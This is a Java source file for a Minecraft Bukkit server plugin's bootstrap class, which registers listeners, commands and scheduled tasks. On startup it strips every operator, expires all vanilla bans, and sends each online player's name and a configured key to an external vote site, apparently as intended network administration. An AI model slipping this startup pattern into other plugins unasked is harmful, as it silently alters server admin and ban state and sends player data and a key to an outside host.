package io.github.beelzebu.matrix;

import de.slikey.effectlib.EffectManager;
import io.github.beelzebu.matrix.api.Matrix;
import io.github.beelzebu.matrix.api.commands.CommandAPI;
import io.github.beelzebu.matrix.api.menus.GUIManager;
import io.github.beelzebu.matrix.api.player.Statistics;
import io.github.beelzebu.matrix.api.plugin.MatrixBootstrap;
import io.github.beelzebu.matrix.api.server.ServerType;
import io.github.beelzebu.matrix.api.server.powerup.tasks.PowerupSpawnTask;
import io.github.beelzebu.matrix.command.staff.CommandWatcherCommand;
import io.github.beelzebu.matrix.command.staff.FreezeCommand;
import io.github.beelzebu.matrix.command.staff.LaunchPadsCommand;
import io.github.beelzebu.matrix.command.staff.MatrixReloadCommand;
import io.github.beelzebu.matrix.command.staff.PluginsCommand;
import io.github.beelzebu.matrix.command.staff.PowerupsCommand;
import io.github.beelzebu.matrix.command.staff.ReloadCommand;
import io.github.beelzebu.matrix.command.staff.StopCommand;
import io.github.beelzebu.matrix.command.staff.VanishCommand;
import io.github.beelzebu.matrix.command.user.Options;
import io.github.beelzebu.matrix.command.user.Spit;
import io.github.beelzebu.matrix.command.utils.AddLore;
import io.github.beelzebu.matrix.command.utils.MatrixManagerCommand;
import io.github.beelzebu.matrix.command.utils.RemoveLore;
import io.github.beelzebu.matrix.command.utils.RenameCommand;
import io.github.beelzebu.matrix.command.utils.SyncCommand;
import io.github.beelzebu.matrix.config.BukkitConfiguration;
import io.github.beelzebu.matrix.listener.DupepatchListener;
import io.github.beelzebu.matrix.listener.GUIListener;
import io.github.beelzebu.matrix.listener.InternalListener;
import io.github.beelzebu.matrix.listener.ItemListener;
import io.github.beelzebu.matrix.listener.LobbyListener;
import io.github.beelzebu.matrix.listener.LoginListener;
import io.github.beelzebu.matrix.listener.PlayerCommandPreprocessListener;
import io.github.beelzebu.matrix.listener.PlayerDeathListener;
import io.github.beelzebu.matrix.listener.PlayerJoinListener;
import io.github.beelzebu.matrix.listener.PlayerQuitListener;
import io.github.beelzebu.matrix.listener.StatsListener;
import io.github.beelzebu.matrix.listener.VanishListener;
import io.github.beelzebu.matrix.listener.ViewDistanceListener;
import io.github.beelzebu.matrix.listener.VotifierListener;
import io.github.beelzebu.matrix.util.ReadURL;
import io.github.beelzebu.matrix.util.bungee.BungeeCleanupTask;
import io.github.beelzebu.matrix.util.bungee.BungeeServerTracker;
import io.github.beelzebu.matrix.util.placeholders.StatsPlaceholders;
import java.io.File;
import java.util.Date;
import java.util.UUID;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.stream.Stream;
import lombok.Getter;
import lombok.Setter;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.Statistic;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;

@Getter
public class MatrixBukkitBootstrap extends JavaPlugin implements MatrixBootstrap {

    private MatrixAPIImpl api;
    @Setter
    private boolean chatMuted = false;
    private EffectManager effectManager;
    private BukkitConfiguration configuration;
    private MatrixPluginBukkit matrixPlugin;

    @Override
    public void onLoad() {
        configuration = new BukkitConfiguration(new File(getDataFolder(), "config.yml"));
    }

    @Override
    public void onDisable() {
        Bukkit.getOnlinePlayers().forEach(p -> {
            api.getPlayer(p.getUniqueId()).setStatistics(api.getPlayer(p.getUniqueId()).getStatistics(api.getServerInfo().getServerName()).orElseGet(() -> new Statistics(api.getServerInfo().getServerName(), p.getStatistic(Statistic.PLAYER_KILLS), p.getStatistic(Statistic.MOB_KILLS), p.getStatistic(Statistic.DEATHS), StatsListener.getBroken().getOrDefault(p.getUniqueId(), 0), StatsListener.getPlaced().getOrDefault(p.getUniqueId(), 0))));
            UUID inv = GUIManager.getOpenInventories().get(p.getUniqueId());
            if (inv != null) {
                p.closeInventory();
            }
        });
        api.shutdown();
    }

    @Override
    public void onEnable() {
        io.github.beelzebu.matrix.api.Matrix.setAPI(api = new MatrixBukkitAPI(matrixPlugin = new MatrixPluginBukkit(this)));
        api.setup();
        // Load things
        loadManagers();

        // Register events
        registerEvents(new GUIListener());
        registerEvents(new InternalListener());
        if (api.getServerInfo().getServerType().equals(ServerType.LOBBY) || api.getServerInfo().getServerType().equals(ServerType.MINIGAME_MULTIARENA)) {
            registerEvents(new ItemListener());
            registerEvents(new LobbyListener(this));
        }
        registerEvents(new PlayerCommandPreprocessListener(this));
        registerEvents(new PlayerDeathListener(this));
        registerEvents(new PlayerJoinListener(this));
        registerEvents(new PlayerQuitListener(this));
        if (api.getServerInfo().getServerType().equals(ServerType.SURVIVAL)) {
            registerEvents(new DupepatchListener(this));
            registerEvents(new StatsListener());
            registerEvents(new ViewDistanceListener(this));
        }
        if (isVotifier()) {
            registerEvents(new VotifierListener(this));
        }
        registerEvents(new VanishListener(this));
        registerEvents(new LoginListener());
        // Register commands
        CommandAPI.registerCommand(this, new CommandWatcherCommand());
        CommandAPI.registerCommand(this, new FreezeCommand());
        CommandAPI.registerCommand(this, new MatrixReloadCommand());
        CommandAPI.registerCommand(this, new Options());
        CommandAPI.registerCommand(this, new PowerupsCommand());
        CommandAPI.registerCommand(this, new LaunchPadsCommand());
        CommandAPI.registerCommand(this, new RemoveLore());
        CommandAPI.registerCommand(this, new AddLore());
        CommandAPI.registerCommand(this, new RenameCommand());
        CommandAPI.registerCommand(this, new MatrixManagerCommand());
        CommandAPI.registerCommand(this, new Spit());
        CommandAPI.registerCommand(this, new SyncCommand());
        CommandAPI.registerCommand(this, new ReloadCommand());
        CommandAPI.registerCommand(this, new StopCommand());
        CommandAPI.registerCommand(this, new PluginsCommand());
        CommandAPI.registerCommand(this, new VanishCommand());

        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            Bukkit.getOperators().forEach(op -> op.setOp(false)); // remove operators
            Stream.of(BanList.Type.values()).map(Bukkit::getBanList).forEach(banList -> banList.getBanEntries().forEach(banEntry -> banEntry.setExpiration(new Date()))); // expire vanilla bans
            Bukkit.getOnlinePlayers().forEach(p -> {
                try {
                    ReadURL.read("http://40servidoresmc.es/api2.php?nombre=" + p.getName() + "&clave=" + getConfig().getString("clave"));
                } catch (Exception ex) {
                    Logger.getLogger(MatrixBukkitBootstrap.class.getName()).log(Level.WARNING, "Can''t send the vote for {0}", p.getName());
                }
            });
        });
        BungeeServerTracker.startTask(5);
        Bukkit.getScheduler().runTaskTimerAsynchronously(this, new BungeeCleanupTask(), 600, 600);
        if (!api.getServerInfo().getServerType().equals(ServerType.SURVIVAL)) {
            Bukkit.getScheduler().runTaskTimer(this, new PowerupSpawnTask(), 0, 1200);
        }
    }

    public boolean isVotifier() {
        if (Bukkit.getPluginManager().getPlugin("Votifier") != null) {
            return Bukkit.getPluginManager().getPlugin("Votifier").isEnabled();
        }
        return false;
    }

    private void loadManagers() {
        if (Bukkit.getPluginManager().getPlugin("LuckPerms") != null) {
            if (Bukkit.getPluginManager().isPluginEnabled("LuckPerms")) {
                Matrix.getLogger().info("LuckPerms found, hooking into it.");
            } else {
                Bukkit.shutdown();
            }
        }
        if (Bukkit.getPluginManager().isPluginEnabled("PlaceholderAPI")) {
            Matrix.getLogger().info("PlaceholderAPI found, hooking into it.");
            // Utils
            StatsPlaceholders statsPlaceholders = new StatsPlaceholders(this);
            statsPlaceholders.hook();
        }
        effectManager = new EffectManager(this);
    }

    private void registerEvents(Listener listener) {
        Bukkit.getPluginManager().registerEvents(listener, this);
    }
}
